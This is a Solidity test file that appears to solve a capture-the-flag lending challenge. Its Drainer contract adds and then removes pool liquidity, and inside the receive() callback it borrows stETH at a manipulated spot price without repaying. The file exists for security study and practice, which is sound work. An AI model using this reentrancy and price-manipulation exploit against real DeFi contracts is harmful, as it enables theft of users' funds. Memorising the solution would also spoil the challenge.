// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {TokenLendBaseTest} from "test/TokenLend/TokenLendBase.t.sol";
import {LiquidityPool} from "src/TokenLend/LiquidityPool.sol";
import {Lender} from "src/TokenLend/Lender.sol";
import {LPToken} from "src/TokenLend/LPToken.sol";
import {SyntheticETH} from "src/TokenLend/SyntheticETH.sol";

contract TokenLendTest is TokenLendBaseTest {
    function testTokenLendExploit() public checkSolved {
        // DO NOT use any cheat codes here.
        // @todo you start from 2 ETH and 2 stETH, exploit the contract’s vulnerabilities to create extra tokens
        Drainer drainer = new Drainer(lpToken, stEth, pool, lender);
        stEth.transfer(address(drainer), 2 ether);
        drainer.start{value: 2 ether}();
    }
}

contract Drainer {
    LPToken lpToken;
    SyntheticETH stEth;
    LiquidityPool pool;
    Lender lender;
    address player;

    uint256 receive_called_count;

    constructor(LPToken _lpToken, SyntheticETH _stEth, LiquidityPool _pool, Lender _lender){
        lpToken = _lpToken;
        stEth = _stEth;
        pool = _pool;
        lender = _lender;
        player = msg.sender;

        stEth.approve(address(pool), type(uint256).max);
        stEth.approve(address(lender), type(uint256).max);
    }

    function start() public payable {
        // Provide liquidity: adding 2 ETH and 2 stETH into the pool
        pool.addLiquidity{value: 2 ether}(2 ether, 2 ether);
        
        // Remove liquidity: 2 ether of LP token
        pool.removeLiquidity(2 ether);

        // No need to repay
        // lender.repay(); 

        // Transfer all ETH and stETH back to player account
        stEth.transfer(player, stEth.balanceOf(address(this)));
        payable(player).transfer(address(this).balance);
    }   

    receive() external payable {
        ++receive_called_count;

        if (receive_called_count == 1){            
            uint256 borrow_amount = 1 ether; // borrow 1 stETH
            uint256 expected_price = pool.getSpotPriceStEth(borrow_amount);
            uint256 expected_collateral_with_fee = (expected_price * (150 + 5)) / 100;
            lender.borrowStEth{value: expected_collateral_with_fee}(borrow_amount);
        }
    }
}
